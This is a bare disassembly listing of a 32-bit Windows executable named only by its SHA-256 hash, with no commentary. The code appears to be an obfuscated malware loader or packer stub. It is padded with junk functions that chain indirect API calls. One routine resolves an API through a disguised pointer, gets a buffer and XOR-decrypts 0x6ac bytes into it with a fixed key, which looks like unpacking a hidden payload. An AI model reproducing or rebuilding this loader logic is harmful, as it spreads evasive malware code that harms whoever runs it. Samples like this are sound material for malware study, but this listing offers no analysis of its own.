
e2871310fc3d9d24e10cca1d48b17b5ef68e26491e7286d7ff650be38bfc4f66.exe:     file format pei-i386


Disassembly of section .text:

004d0000 <.text>:
	...
  4d0008:	mov    edi,edi
  4d000a:	push   ebp
  4d000b:	mov    ebp,esp
  4d000d:	sub    esp,0x28
  4d0010:	lea    esi,ds:0x4d3138
  4d0016:	sub    ebx,DWORD PTR [esi-0xe0]
  4d001c:	mov    edx,0x0
  4d0021:	push   edx
  4d0022:	notrack call DWORD PTR ds:0x4d2054
  4d0029:	push   esi
  4d002a:	push   DWORD PTR [esi+0x8]
  4d002d:	push   edi
  4d002e:	push   ecx
  4d002f:	call   0x4d08a0
  4d0034:	add    esp,0xc
  4d0037:	pop    esi
  4d0038:	mov    eax,0x4d2028
  4d003d:	mov    eax,DWORD PTR [eax]
  4d003f:	push   eax
  4d0040:	push   DWORD PTR [esi+0x24]
  4d0043:	pop    eax
  4d0044:	call   eax
  4d0046:	add    esp,0x28
  4d0049:	pop    ebp
  4d004a:	ret    
	...
  4d0053:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0059:	sub    esp,0x38
  4d005c:	mov    ecx,0x4d30d4
  4d0061:	or     DWORD PTR [ecx+0x128],0x6129
  4d006b:	push   ecx
  4d006c:	lea    eax,[ecx-0xd4]
  4d0072:	push   eax
  4d0073:	notrack call DWORD PTR ds:0x4d2028
  4d007a:	test   eax,eax
  4d007c:	jne    0x4d006c
  4d007e:	pop    ecx
  4d007f:	push   ecx
  4d0080:	push   edx
  4d0081:	push   edx
  4d0082:	call   0x4d04d4
  4d0087:	add    esp,0x8
  4d008a:	pop    ecx
  4d008b:	push   ecx
  4d008c:	mov    edi,0x0
  4d0091:	push   edi
  4d0092:	notrack call DWORD PTR ds:0x4d206c
  4d0099:	pop    ecx
  4d009a:	add    esp,0x38
  4d009d:	pop    ebp
  4d009e:	ret    
  4d009f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d00a5:	sub    esp,0x5c
  4d00a8:	lea    esi,[edi+0x4c]
  4d00ab:	add    ebx,DWORD PTR [ebp-0x8]
  4d00ae:	push   esi
  4d00af:	push   edx
  4d00b0:	push   eax
  4d00b1:	call   0x4d0054
  4d00b6:	add    esp,0x8
  4d00b9:	pop    esi
  4d00ba:	mov    edx,0x0
  4d00bf:	push   edx
  4d00c0:	notrack call DWORD PTR ds:0x4d2004
  4d00c7:	mov    edi,0x0
  4d00cc:	push   edi
  4d00cd:	notrack call DWORD PTR ds:0x4d200c
  4d00d4:	add    esp,0x5c
  4d00d7:	pop    ebp
  4d00d8:	ret    
  4d00d9:	add    BYTE PTR [eax],al
  4d00db:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d00e1:	sub    esp,0x4c
  4d00e4:	lea    esi,ds:0x4d3060
  4d00ea:	sub    eax,ecx
  4d00ec:	push   esi
  4d00ed:	push   ecx
  4d00ee:	push   edx
  4d00ef:	push   edi
  4d00f0:	push   DWORD PTR [esi+0x88]
  4d00f6:	call   0x4d0858
  4d00fb:	add    esp,0x10
  4d00fe:	pop    esi
  4d00ff:	push   0x0
  4d0101:	notrack call DWORD PTR ds:0x4d2018
  4d0108:	mov    edx,0x0
  4d010d:	push   edx
  4d010e:	notrack call DWORD PTR ds:0x4d204c
  4d0115:	add    esp,0x4c
  4d0118:	pop    ebp
  4d0119:	ret    
  4d011a:	add    BYTE PTR [eax],al
  4d011c:	mov    edi,edi
  4d011e:	push   ebp
  4d011f:	mov    ebp,esp
  4d0121:	sub    esp,0x44
  4d0124:	mov    ecx,0x4d30e4
  4d0129:	cmp    ecx,0x450e
  4d012f:	jb     0x4d011f
  4d0131:	push   ecx
  4d0132:	push   edx
  4d0133:	push   ebx
  4d0134:	push   DWORD PTR [ecx+0x17c]
  4d013a:	call   0x4d02c8
  4d013f:	add    esp,0xc
  4d0142:	pop    ecx
  4d0143:	push   ecx
  4d0144:	mov    esi,0x0
  4d0149:	push   esi
  4d014a:	notrack call DWORD PTR ds:0x4d2038
  4d0151:	pop    ecx
  4d0152:	push   ecx
  4d0153:	mov    edi,0x0
  4d0158:	push   edi
  4d0159:	notrack call DWORD PTR ds:0x4d207c
  4d0160:	pop    ecx
  4d0161:	add    esp,0x44
  4d0164:	pop    ebp
  4d0165:	ret    
  4d0166:	add    BYTE PTR [eax],al
  4d0168:	add    BYTE PTR [eax],al
  4d016a:	add    BYTE PTR [eax],al
  4d016c:	mov    edi,edi
  4d016e:	push   ebp
  4d016f:	mov    ebp,esp
  4d0171:	sub    esp,0x40
  4d0174:	lea    ebx,ds:0x4d30c4
  4d017a:	or     DWORD PTR [ebp-0x8],ecx
  4d017d:	push   ebx
  4d017e:	push   edx
  4d017f:	push   DWORD PTR [ebx+0x10]
  4d0182:	push   esi
  4d0183:	call   0x4d069c
  4d0188:	add    esp,0xc
  4d018b:	pop    ebx
  4d018c:	push   0x0
  4d018e:	notrack call DWORD PTR ds:0x4d2000
  4d0195:	mov    esi,0x0
  4d019a:	push   esi
  4d019b:	notrack call DWORD PTR ds:0x4d2000
  4d01a2:	add    esp,0x40
  4d01a5:	pop    ebp
  4d01a6:	ret    
  4d01a7:	add    BYTE PTR [eax],al
  4d01a9:	add    BYTE PTR [eax],al
  4d01ab:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d01b1:	sub    esp,0x44
  4d01b4:	mov    esi,0x4d3000
  4d01b9:	xor    DWORD PTR [esi+0x1a0],ebx
  4d01bf:	push   esi
  4d01c0:	push   eax
  4d01c1:	push   edi
  4d01c2:	call   0x4d07b4
  4d01c7:	add    esp,0x8
  4d01ca:	pop    esi
  4d01cb:	push   0x0
  4d01cd:	notrack call DWORD PTR ds:0x4d2030
  4d01d4:	mov    edx,0x0
  4d01d9:	push   edx
  4d01da:	notrack call DWORD PTR ds:0x4d2048
  4d01e1:	add    esp,0x44
  4d01e4:	pop    ebp
  4d01e5:	ret    
  4d01e6:	add    BYTE PTR [eax],al
  4d01e8:	mov    edi,edi
  4d01ea:	push   ebp
  4d01eb:	mov    ebp,esp
  4d01ed:	sub    esp,0x3c
  4d01f0:	mov    ebx,0x4d3110
  4d01f5:	sub    DWORD PTR [ebp-0x8],0x69
  4d01f9:	push   ebx
  4d01fa:	push   DWORD PTR [ebx+0x4]
  4d01fd:	push   edi
  4d01fe:	call   0x4d07f8
  4d0203:	add    esp,0x8
  4d0206:	pop    ebx
  4d0207:	lea    eax,[ebx-0x110]
  4d020d:	push   eax
  4d020e:	notrack call DWORD PTR ds:0x4d2028
  4d0215:	test   eax,eax
  4d0217:	jne    0x4d0208
  4d0219:	mov    esi,0x0
  4d021e:	push   esi
  4d021f:	notrack call DWORD PTR ds:0x4d2010
  4d0226:	add    esp,0x3c
  4d0229:	pop    ebp
  4d022a:	ret    
	...
  4d023f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0245:	sub    esp,0x4c
  4d0248:	mov    edi,0x4d31c4
  4d024d:	sub    edx,DWORD PTR [ebp-0x48]
  4d0250:	mov    edx,0x0
  4d0255:	push   edx
  4d0256:	notrack call DWORD PTR ds:0x4d2038
  4d025d:	push   edi
  4d025e:	push   DWORD PTR [edi+0xa0]
  4d0264:	push   DWORD PTR [edi+0x94]
  4d026a:	call   0x4d0324
  4d026f:	add    esp,0x8
  4d0272:	pop    edi
  4d0273:	push   0x0
  4d0275:	notrack call DWORD PTR ds:0x4d206c
  4d027c:	add    esp,0x4c
  4d027f:	pop    ebp
  4d0280:	ret    
  4d0281:	add    BYTE PTR [eax],al
  4d0283:	add    BYTE PTR [eax],al
  4d0285:	add    BYTE PTR [eax],al
  4d0287:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d028d:	sub    esp,0x24
  4d0290:	lea    ebx,ds:0x4d3114
  4d0296:	or     DWORD PTR [ebx-0x2c],ebx
  4d0299:	push   ebx
  4d029a:	push   edx
  4d029b:	push   DWORD PTR [ebx+0x1ac]
  4d02a1:	call   0x4d0a5c
  4d02a6:	add    esp,0x8
  4d02a9:	pop    ebx
  4d02aa:	push   0x0
  4d02ac:	notrack call DWORD PTR ds:0x4d2010
  4d02b3:	push   0x0
  4d02b5:	notrack call DWORD PTR ds:0x4d200c
  4d02bc:	add    esp,0x24
  4d02bf:	pop    ebp
  4d02c0:	ret    
  4d02c1:	add    BYTE PTR [eax],al
  4d02c3:	add    BYTE PTR [eax],al
  4d02c5:	add    BYTE PTR [eax],al
  4d02c7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d02cd:	sub    esp,0x54
  4d02d0:	lea    eax,[ecx-0xdc]
  4d02d6:	add    DWORD PTR [eax+0x174],0x56c4
  4d02e0:	push   eax
  4d02e1:	push   DWORD PTR [eax+0xd0]
  4d02e7:	push   ebx
  4d02e8:	push   DWORD PTR [eax+0xac]
  4d02ee:	push   DWORD PTR [eax+0x60]
  4d02f1:	call   0x4d0770
  4d02f6:	add    esp,0x10
  4d02f9:	pop    eax
  4d02fa:	push   eax
  4d02fb:	mov    edi,0x0
  4d0300:	push   edi
  4d0301:	notrack call DWORD PTR ds:0x4d2054
  4d0308:	pop    eax
  4d0309:	push   eax
  4d030a:	push   0x0
  4d030c:	notrack call DWORD PTR ds:0x4d2004
  4d0313:	pop    eax
  4d0314:	add    esp,0x54
  4d0317:	pop    ebp
  4d0318:	ret    
	...
  4d0321:	add    BYTE PTR [eax],al
  4d0323:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0329:	sub    esp,0x48
  4d032c:	lea    ebx,[edi+0x14]
  4d032f:	xor    DWORD PTR [ebx-0x140],0x4458
  4d0339:	push   ebx
  4d033a:	push   DWORD PTR [ebx+0x94]
  4d0340:	push   edi
  4d0341:	call   0x4d01ac
  4d0346:	add    esp,0x8
  4d0349:	pop    ebx
  4d034a:	push   0x0
  4d034c:	notrack call DWORD PTR ds:0x4d206c
  4d0353:	lea    edx,[ebx-0x1d8]
  4d0359:	push   edx
  4d035a:	notrack call DWORD PTR ds:0x4d2028
  4d0361:	test   eax,eax
  4d0363:	jne    0x4d0354
  4d0365:	add    esp,0x48
  4d0368:	pop    ebp
  4d0369:	ret    
  4d036a:	add    BYTE PTR [eax],al
  4d036c:	mov    edi,edi
  4d036e:	push   ebp
  4d036f:	mov    ebp,esp
  4d0371:	sub    esp,0x54
  4d0374:	lea    edi,[eax-0xc4]
  4d037a:	mov    DWORD PTR [ebp-0x40],ebx
  4d037d:	mov    esi,0x0
  4d0382:	push   esi
  4d0383:	notrack call DWORD PTR ds:0x4d2004
  4d038a:	push   edi
  4d038b:	push   DWORD PTR [edi+0x108]
  4d0391:	push   DWORD PTR [edi+0x150]
  4d0397:	call   0x4d016c
  4d039c:	add    esp,0x8
  4d039f:	pop    edi
  4d03a0:	mov    eax,0x0
  4d03a5:	push   eax
  4d03a6:	notrack call DWORD PTR ds:0x4d207c
  4d03ad:	add    esp,0x54
  4d03b0:	pop    ebp
  4d03b1:	ret    
  4d03b2:	add    BYTE PTR [eax],al
  4d03b4:	mov    edi,edi
  4d03b6:	push   ebp
  4d03b7:	mov    ebp,esp
  4d03b9:	sub    esp,0x3c
  4d03bc:	lea    eax,[ebx+0xe4]
  4d03c2:	xor    DWORD PTR [eax-0xd4],0x1a74
  4d03cc:	push   eax
  4d03cd:	mov    ebx,0x0
  4d03d2:	push   ebx
  4d03d3:	notrack call DWORD PTR ds:0x4d206c
  4d03da:	pop    eax
  4d03db:	push   eax
  4d03dc:	push   DWORD PTR [eax+0x20]
  4d03df:	push   ebx
  4d03e0:	push   DWORD PTR [eax+0x17c]
  4d03e6:	push   ecx
  4d03e7:	call   0x4d036c
  4d03ec:	add    esp,0x10
  4d03ef:	pop    eax
  4d03f0:	push   eax
  4d03f1:	push   0x0
  4d03f3:	notrack call DWORD PTR ds:0x4d2038
  4d03fa:	pop    eax
  4d03fb:	add    esp,0x3c
  4d03fe:	pop    ebp
  4d03ff:	ret    
  4d0400:	mov    edi,edi
  4d0402:	push   ebp
  4d0403:	mov    ebp,esp
  4d0405:	sub    esp,0x40
  4d0408:	lea    ebx,[edx-0x10]
  4d040b:	adc    edx,0x5d46
  4d0411:	push   ebx
  4d0412:	push   edi
  4d0413:	push   DWORD PTR [ebx+0x1b8]
  4d0419:	call   0x4d051c
  4d041e:	add    esp,0x8
  4d0421:	pop    ebx
  4d0422:	mov    eax,0x0
  4d0427:	push   eax
  4d0428:	notrack call DWORD PTR ds:0x4d2054
  4d042f:	push   0x0
  4d0431:	notrack call DWORD PTR ds:0x4d200c
  4d0438:	add    esp,0x40
  4d043b:	pop    ebp
  4d043c:	ret    
  4d043d:	add    BYTE PTR [eax],al
  4d043f:	add    BYTE PTR [edx+0x0],ch
  4d0442:	call   DWORD PTR ds:0x4d200c
  4d0448:	call   DWORD PTR ds:0x4d2020
  4d044e:	sub    esp,0x8
  4d0451:	call   DWORD PTR ds:0x4d2020
  4d0457:	sub    esp,0x8
  4d045a:	xor    eax,eax
  4d045c:	lea    eax,[eax*2+0x4d3100]
  4d0463:	lea    ecx,[eax+0x4]
  4d0466:	add    BYTE PTR [ecx],0xb0
  4d0469:	push   eax
  4d046a:	call   DWORD PTR ds:0x4d2044
  4d0470:	mov    ecx,DWORD PTR [eax+0x3c]
  4d0473:	push   DWORD PTR [eax+ecx*1+0x29]
  4d0477:	pop    eax
  4d0478:	mov    cl,0x2c
  4d047a:	cmp    al,cl
  4d047c:	pusha  
  4d047d:	ja     0x4d0008
  4d0483:	popa   
  4d0484:	ret    
  4d0485:	add    BYTE PTR [eax],al
  4d0487:	repz add BYTE PTR [eax],al
  4d048a:	add    BYTE PTR [eax],al
  4d048c:	mov    edi,edi
  4d048e:	push   ebp
  4d048f:	mov    ebp,esp
  4d0491:	sub    esp,0x5c
  4d0494:	lea    edx,[esi-0x98]
  4d049a:	and    DWORD PTR [edx+0x170],ecx
  4d04a0:	push   edx
  4d04a1:	push   0x0
  4d04a3:	notrack call DWORD PTR ds:0x4d2018
  4d04aa:	pop    edx
  4d04ab:	push   edx
  4d04ac:	push   DWORD PTR [edx+0xf0]
  4d04b2:	push   edi
  4d04b3:	push   ecx
  4d04b4:	push   edi
  4d04b5:	call   0x4d0400
  4d04ba:	add    esp,0x10
  4d04bd:	pop    edx
  4d04be:	push   edx
  4d04bf:	mov    esi,0x0
  4d04c4:	push   esi
  4d04c5:	notrack call DWORD PTR ds:0x4d2010
  4d04cc:	pop    edx
  4d04cd:	add    esp,0x5c
  4d04d0:	pop    ebp
  4d04d1:	ret    
  4d04d2:	add    BYTE PTR [eax],al
  4d04d4:	mov    edi,edi
  4d04d6:	push   ebp
  4d04d7:	mov    ebp,esp
  4d04d9:	sub    esp,0x38
  4d04dc:	lea    edi,ds:0x4d31ac
  4d04e2:	xor    ebx,0xffffdc8e
  4d04e8:	push   0x0
  4d04ea:	notrack call DWORD PTR ds:0x4d2054
  4d04f1:	push   edi
  4d04f2:	push   ebx
  4d04f3:	push   eax
  4d04f4:	push   edx
  4d04f5:	push   DWORD PTR [edi+0x1c]
  4d04f8:	call   0x4d092c
  4d04fd:	add    esp,0x10
  4d0500:	pop    edi
  4d0501:	push   0x0
  4d0503:	notrack call DWORD PTR ds:0x4d200c
  4d050a:	add    esp,0x38
  4d050d:	pop    ebp
  4d050e:	ret    
	...
  4d051b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0521:	sub    esp,0x34
  4d0524:	lea    ecx,ds:0x4d30c4
  4d052a:	and    ebx,DWORD PTR [ecx-0x28]
  4d052d:	push   ecx
  4d052e:	push   0x0
  4d0530:	notrack call DWORD PTR ds:0x4d200c
  4d0537:	pop    ecx
  4d0538:	push   ecx
  4d0539:	push   ebx
  4d053a:	push   DWORD PTR [ecx+0x198]
  4d0540:	push   DWORD PTR [ecx+0x5c]
  4d0543:	push   DWORD PTR [ecx+0x120]
  4d0549:	call   0x4d0610
  4d054e:	add    esp,0x10
  4d0551:	pop    ecx
  4d0552:	push   ecx
  4d0553:	mov    esi,0x0
  4d0558:	push   esi
  4d0559:	notrack call DWORD PTR ds:0x4d200c
  4d0560:	pop    ecx
  4d0561:	add    esp,0x34
  4d0564:	pop    ebp
  4d0565:	ret    
  4d0566:	add    BYTE PTR [eax],al
  4d0568:	mov    edi,edi
  4d056a:	push   ebp
  4d056b:	mov    ebp,esp
  4d056d:	sub    esp,0x34
  4d0570:	lea    edx,ds:0x4d3090
  4d0576:	or     DWORD PTR [edx+0x10c],0xffffa15b
  4d0580:	push   edx
  4d0581:	push   DWORD PTR [edx+0x1c0]
  4d0587:	push   eax
  4d0588:	push   DWORD PTR [edx+0xb0]
  4d058e:	push   DWORD PTR [edx+0x18c]
  4d0594:	call   0x4d0240
  4d0599:	add    esp,0x10
  4d059c:	pop    edx
  4d059d:	push   edx
  4d059e:	push   0x0
  4d05a0:	notrack call DWORD PTR ds:0x4d2038
  4d05a7:	pop    edx
  4d05a8:	push   edx
  4d05a9:	mov    esi,0x0
  4d05ae:	push   esi
  4d05af:	notrack call DWORD PTR ds:0x4d2030
  4d05b6:	pop    edx
  4d05b7:	add    esp,0x34
  4d05ba:	pop    ebp
  4d05bb:	ret    
  4d05bc:	mov    edi,edi
  4d05be:	push   ebp
  4d05bf:	mov    ebp,esp
  4d05c1:	sub    esp,0x30
  4d05c4:	mov    ecx,0x4d312c
  4d05c9:	sub    esi,0x74
  4d05cc:	push   ecx
  4d05cd:	push   DWORD PTR [ecx+0x12c]
  4d05d3:	push   esi
  4d05d4:	call   0x4d06dc
  4d05d9:	add    esp,0x8
  4d05dc:	pop    ecx
  4d05dd:	push   ecx
  4d05de:	push   0x0
  4d05e0:	notrack call DWORD PTR ds:0x4d2040
  4d05e7:	pop    ecx
  4d05e8:	push   ecx
  4d05e9:	mov    eax,0x0
  4d05ee:	push   eax
  4d05ef:	notrack call DWORD PTR ds:0x4d2040
  4d05f6:	pop    ecx
  4d05f7:	add    esp,0x30
  4d05fa:	pop    ebp
  4d05fb:	ret    
	...
  4d0610:	mov    edi,edi
  4d0612:	push   ebp
  4d0613:	mov    ebp,esp
  4d0615:	sub    esp,0x24
  4d0618:	lea    esi,ds:0x4d31a0
  4d061e:	cmp    esi,0x1fd2
  4d0624:	jbe    0x4d0613
  4d0626:	push   esi
  4d0627:	push   DWORD PTR [esi+0x1cc]
  4d062d:	push   eax
  4d062e:	push   DWORD PTR [esi+0xc4]
  4d0634:	call   0x4d0288
  4d0639:	add    esp,0xc
  4d063c:	pop    esi
  4d063d:	push   0x0
  4d063f:	notrack call DWORD PTR ds:0x4d207c
  4d0646:	mov    eax,0x0
  4d064b:	push   eax
  4d064c:	notrack call DWORD PTR ds:0x4d2030
  4d0653:	add    esp,0x24
  4d0656:	pop    ebp
  4d0657:	ret    
  4d0658:	mov    edi,edi
  4d065a:	push   ebp
  4d065b:	mov    ebp,esp
  4d065d:	sub    esp,0x2c
  4d0660:	lea    edx,[ecx-0x100]
  4d0666:	or     DWORD PTR [ebp-0x10],0xffffff88
  4d066a:	push   edx
  4d066b:	push   0x0
  4d066d:	notrack call DWORD PTR ds:0x4d2010
  4d0674:	pop    edx
  4d0675:	push   edx
  4d0676:	push   esi
  4d0677:	push   DWORD PTR [edx+0x1c0]
  4d067d:	push   DWORD PTR [edx+0x178]
  4d0683:	call   0x4d01e8
  4d0688:	add    esp,0xc
  4d068b:	pop    edx
  4d068c:	push   edx
  4d068d:	push   0x0
  4d068f:	notrack call DWORD PTR ds:0x4d206c
  4d0696:	pop    edx
  4d0697:	add    esp,0x2c
  4d069a:	pop    ebp
  4d069b:	ret    
  4d069c:	mov    edi,edi
  4d069e:	push   ebp
  4d069f:	mov    ebp,esp
  4d06a1:	sub    esp,0x60
  4d06a4:	lea    esi,ds:0x4d308c
  4d06aa:	adc    DWORD PTR [ebp-0x4c],edi
  4d06ad:	push   esi
  4d06ae:	push   edi
  4d06af:	push   DWORD PTR [esi+0xd0]
  4d06b5:	call   0x4d0568
  4d06ba:	add    esp,0x8
  4d06bd:	pop    esi
  4d06be:	push   0x0
  4d06c0:	notrack call DWORD PTR ds:0x4d2054
  4d06c7:	notrack call DWORD PTR ds:0x4d202c
  4d06ce:	add    esp,0x60
  4d06d1:	pop    ebp
  4d06d2:	ret    
	...
  4d06db:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d06e1:	sub    esp,0x28
  4d06e4:	sbb    DWORD PTR [ecx-0xb0],esi
  4d06ea:	mov    edx,0x4d31c8
  4d06ef:	push   edx
  4d06f0:	mov    ebx,0x6ac
  4d06f5:	push   ebx
  4d06f6:	mov    ecx,0x6ac
  4d06fb:	push   ecx
  4d06fc:	mov    edi,0x40001
  4d0701:	push   edi
  4d0702:	mov    edx,0x8629859e
  4d0707:	push   DWORD PTR [edx+0x7a239a86]
  4d070d:	sub    DWORD PTR [esp],0x2
  4d0711:	mov    edx,0x4d2044
  4d0716:	pop    DWORD PTR [edx]
  4d0718:	notrack call DWORD PTR ds:0x4d2044
  4d071f:	xchg   DWORD PTR [esp],eax
  4d0722:	mov    edx,eax
  4d0724:	pop    DWORD PTR [edx-0x6c]
  4d0727:	mov    esi,DWORD PTR [edx-0x6c]
  4d072a:	lea    esi,[esi]
  4d072c:	sub    ebx,ebx
  4d072e:	dec    ebx
  4d072f:	and    ebx,0x4d0ae8
  4d0735:	mov    ecx,0x9de45a73
  4d073a:	xor    eax,eax
  4d073c:	xor    edi,edi
  4d073e:	push   DWORD PTR [ebx+edi*1]
  4d0741:	inc    DWORD PTR [esp]
  4d0744:	xor    DWORD PTR [esp],ecx
  4d0747:	pop    DWORD PTR [esi+edi*2]
  4d074a:	push   DWORD PTR [ebx]
  4d074c:	pop    ecx
  4d074d:	add    ebx,0x4
  4d0750:	add    esi,0x4
  4d0753:	add    eax,0x4
  4d0756:	cmp    eax,0x6ac
  4d075b:	jne    0x4d073c
  4d075d:	push   edx
  4d075e:	push   0x0
  4d0760:	notrack call DWORD PTR ds:0x4d2000
  4d0767:	pop    edx
  4d0768:	add    esp,0x28
  4d076b:	pop    ebp
  4d076c:	ret    
  4d076d:	add    BYTE PTR [eax],al
  4d076f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0775:	sub    esp,0x58
  4d0778:	mov    ebx,0x4d3014
  4d077d:	cmp    ebx,0x38a1
  4d0783:	jbe    0x4d0773
  4d0785:	push   ebx
  4d0786:	push   eax
  4d0787:	push   DWORD PTR [ebx+0x4]
  4d078a:	push   ecx
  4d078b:	push   edi
  4d078c:	call   0x4d03b4
  4d0791:	add    esp,0x10
  4d0794:	pop    ebx
  4d0795:	push   0x0
  4d0797:	notrack call DWORD PTR ds:0x4d204c
  4d079e:	mov    eax,0x0
  4d07a3:	push   eax
  4d07a4:	notrack call DWORD PTR ds:0x4d2004
  4d07ab:	add    esp,0x58
  4d07ae:	pop    ebp
  4d07af:	ret    
  4d07b0:	add    BYTE PTR [eax],al
  4d07b2:	add    BYTE PTR [eax],al
  4d07b4:	mov    edi,edi
  4d07b6:	push   ebp
  4d07b7:	mov    ebp,esp
  4d07b9:	sub    esp,0x38
  4d07bc:	mov    eax,0x4d30c0
  4d07c1:	adc    edx,0x51e9
  4d07c7:	push   eax
  4d07c8:	push   DWORD PTR [eax+0x1a8]
  4d07ce:	push   ecx
  4d07cf:	push   ebx
  4d07d0:	call   0x4d09c0
  4d07d5:	add    esp,0xc
  4d07d8:	pop    eax
  4d07d9:	push   eax
  4d07da:	mov    edx,0x0
  4d07df:	push   edx
  4d07e0:	notrack call DWORD PTR ds:0x4d2054
  4d07e7:	pop    eax
  4d07e8:	push   eax
  4d07e9:	push   0x0
  4d07eb:	notrack call DWORD PTR ds:0x4d2000
  4d07f2:	pop    eax
  4d07f3:	add    esp,0x38
  4d07f6:	pop    ebp
  4d07f7:	ret    
  4d07f8:	mov    edi,edi
  4d07fa:	push   ebp
  4d07fb:	mov    ebp,esp
  4d07fd:	sub    esp,0x50
  4d0800:	lea    eax,ds:0x4d3010
  4d0806:	or     DWORD PTR [ebp-0x34],0x2a
  4d080a:	push   eax
  4d080b:	push   DWORD PTR [eax+0x134]
  4d0811:	push   DWORD PTR [eax+0x8c]
  4d0817:	push   DWORD PTR [eax+0x1e8]
  4d081d:	push   edx
  4d081e:	call   0x4d05bc
  4d0823:	add    esp,0x10
  4d0826:	pop    eax
  4d0827:	push   eax
  4d0828:	push   0x0
  4d082a:	notrack call DWORD PTR ds:0x4d200c
  4d0831:	pop    eax
  4d0832:	push   eax
  4d0833:	push   0x0
  4d0835:	notrack call DWORD PTR ds:0x4d206c
  4d083c:	pop    eax
  4d083d:	add    esp,0x50
  4d0840:	pop    ebp
  4d0841:	ret    
	...
  4d0856:	add    BYTE PTR [eax],al
  4d0858:	mov    edi,edi
  4d085a:	push   ebp
  4d085b:	mov    ebp,esp
  4d085d:	sub    esp,0x34
  4d0860:	lea    ecx,ds:0x4d311c
  4d0866:	mov    esi,DWORD PTR [ebp-0x8]
  4d0869:	push   ecx
  4d086a:	push   eax
  4d086b:	push   edi
  4d086c:	push   DWORD PTR [ecx+0x160]
  4d0872:	push   DWORD PTR [ecx+0x3c]
  4d0875:	call   0x4d0658
  4d087a:	add    esp,0x10
  4d087d:	pop    ecx
  4d087e:	push   ecx
  4d087f:	push   0x0
  4d0881:	notrack call DWORD PTR ds:0x4d207c
  4d0888:	pop    ecx
  4d0889:	push   ecx
  4d088a:	mov    ecx,0x0
  4d088f:	push   ecx
  4d0890:	notrack call DWORD PTR ds:0x4d207c
  4d0897:	pop    ecx
  4d0898:	add    esp,0x34
  4d089b:	pop    ebp
  4d089c:	ret    
  4d089d:	add    BYTE PTR [eax],al
  4d089f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d08a5:	sub    esp,0x20
  4d08a8:	mov    edi,0x4d3028
  4d08ad:	add    DWORD PTR [edi+0x84],0xffffcd94
  4d08b7:	push   edi
  4d08b8:	push   DWORD PTR [edi+0xe8]
  4d08be:	push   DWORD PTR [edi+0x128]
  4d08c4:	push   eax
  4d08c5:	call   0x4d00a0
  4d08ca:	add    esp,0xc
  4d08cd:	pop    edi
  4d08ce:	push   0x0
  4d08d0:	notrack call DWORD PTR ds:0x4d2018
  4d08d7:	push   0x0
  4d08d9:	notrack call DWORD PTR ds:0x4d206c
  4d08e0:	add    esp,0x20
  4d08e3:	pop    ebp
  4d08e4:	ret    
  4d08e5:	add    BYTE PTR [eax],al
  4d08e7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d08ed:	sub    esp,0x3c
  4d08f0:	mov    eax,0x4d306c
  4d08f5:	sbb    ecx,DWORD PTR [eax+0x150]
  4d08fb:	push   eax
  4d08fc:	push   esi
  4d08fd:	push   DWORD PTR [eax+0x13c]
  4d0903:	call   0x4d00dc
  4d0908:	add    esp,0x8
  4d090b:	pop    eax
  4d090c:	push   eax
  4d090d:	mov    ecx,0x0
  4d0912:	push   ecx
  4d0913:	notrack call DWORD PTR ds:0x4d2038
  4d091a:	pop    eax
  4d091b:	push   eax
  4d091c:	push   0x0
  4d091e:	notrack call DWORD PTR ds:0x4d2000
  4d0925:	pop    eax
  4d0926:	add    esp,0x3c
  4d0929:	pop    ebp
  4d092a:	ret    
  4d092b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0931:	sub    esp,0x40
  4d0934:	mov    edx,0x4d31f0
  4d0939:	sub    DWORD PTR [edx-0x110],0x22
  4d0940:	push   edx
  4d0941:	mov    edx,0x0
  4d0946:	push   edx
  4d0947:	notrack call DWORD PTR ds:0x4d2040
  4d094e:	pop    edx
  4d094f:	push   edx
  4d0950:	push   DWORD PTR [edx+0x128]
  4d0956:	push   DWORD PTR [edx+0x100]
  4d095c:	call   0x4d0a08
  4d0961:	add    esp,0x8
  4d0964:	pop    edx
  4d0965:	push   edx
  4d0966:	mov    edx,0x0
  4d096b:	push   edx
  4d096c:	notrack call DWORD PTR ds:0x4d2010
  4d0973:	pop    edx
  4d0974:	add    esp,0x40
  4d0977:	pop    ebp
  4d0978:	ret    
  4d0979:	add    BYTE PTR [eax],al
  4d097b:	add    BYTE PTR [eax],al
  4d097d:	add    BYTE PTR [eax],al
  4d097f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0985:	sub    esp,0x4c
  4d0988:	lea    esi,[edx-0x20]
  4d098b:	mov    DWORD PTR [esi+0x4c],0xffffffcf
  4d0992:	mov    ecx,0x0
  4d0997:	push   ecx
  4d0998:	notrack call DWORD PTR ds:0x4d2010
  4d099f:	push   esi
  4d09a0:	push   DWORD PTR [esi+0x54]
  4d09a3:	push   DWORD PTR [esi]
  4d09a5:	call   0x4d08e8
  4d09aa:	add    esp,0x8
  4d09ad:	pop    esi
  4d09ae:	push   0x0
  4d09b0:	notrack call DWORD PTR ds:0x4d204c
  4d09b7:	add    esp,0x4c
  4d09ba:	pop    ebp
  4d09bb:	ret    
  4d09bc:	add    BYTE PTR [eax],al
  4d09be:	add    BYTE PTR [eax],al
  4d09c0:	mov    edi,edi
  4d09c2:	push   ebp
  4d09c3:	mov    ebp,esp
  4d09c5:	sub    esp,0x48
  4d09c8:	lea    edx,[eax+0xa0]
  4d09ce:	or     DWORD PTR [edx-0x98],edx
  4d09d4:	push   edx
  4d09d5:	mov    edi,0x0
  4d09da:	push   edi
  4d09db:	notrack call DWORD PTR ds:0x4d2030
  4d09e2:	pop    edx
  4d09e3:	push   edx
  4d09e4:	push   ecx
  4d09e5:	push   DWORD PTR [edx+0x24]
  4d09e8:	call   0x4d0980
  4d09ed:	add    esp,0x8
  4d09f0:	pop    edx
  4d09f1:	push   edx
  4d09f2:	push   0x0
  4d09f4:	notrack call DWORD PTR ds:0x4d2054
  4d09fb:	pop    edx
  4d09fc:	add    esp,0x48
  4d09ff:	pop    ebp
  4d0a00:	ret    
